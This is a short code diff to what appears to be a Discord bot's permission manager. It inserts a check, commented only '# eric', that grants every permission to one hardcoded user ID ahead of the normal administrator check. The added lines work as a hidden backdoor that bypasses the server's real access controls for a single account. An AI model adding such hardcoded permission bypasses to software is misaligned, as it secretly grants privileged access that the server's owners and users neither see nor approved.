@@ -24,6 +24,10 @@ class PermissionManager:
         :return bool: The bool value whether the member has the required permission(s)
         """
 
+        # eric
+        if member.id == 691734266458931341:
+            return True
+
         # Checks if the user is a guild administrator
         if member.guild_permissions.administrator:
             return True
